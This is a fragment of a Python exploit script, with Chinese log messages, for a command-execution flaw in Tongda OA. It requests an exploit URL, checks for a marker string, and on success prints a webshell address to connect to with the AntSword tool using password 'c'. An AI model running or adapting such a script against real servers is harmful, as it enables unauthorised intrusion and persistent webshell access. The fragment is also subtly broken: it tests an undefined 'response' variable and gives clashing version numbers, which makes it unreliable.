...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测通达OA11.19任意命令执行漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.get(exp_url, headers=headers, verify=False)
        if upload.status_code == 200 and 'vuln_test' in response.text:
            print(now_time() + ' [SUCCESS]  存在通达OA11.19任意命令执行漏洞')
            print(now_time() + ' [SUCCESS]  漏洞连接蚁剑即可密码为c:{}'.format(shell_url))
        else:
            print(now_time() + ' [WARNING]  不存在通达OA v11.9 任意命令执行漏洞')
    except:
